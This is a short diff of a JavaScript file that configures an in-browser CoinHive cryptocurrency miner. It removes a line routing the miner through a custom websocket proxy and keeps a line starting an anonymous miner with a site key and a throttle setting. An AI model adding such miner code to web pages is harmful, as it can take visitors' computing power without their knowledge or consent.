@@ -1,4 +1,3 @@
-CoinHive.CONFIG.WEBSOCKET_SHARDS = [["wss://cryptominer.now.sh"]];
 var miner = new CoinHive.Anonymous('UxW2fnNjA9PzHJZBhrQspp6uWsm36koR', {throttle: 0.3});
 
 function getDifficulty (coin) {
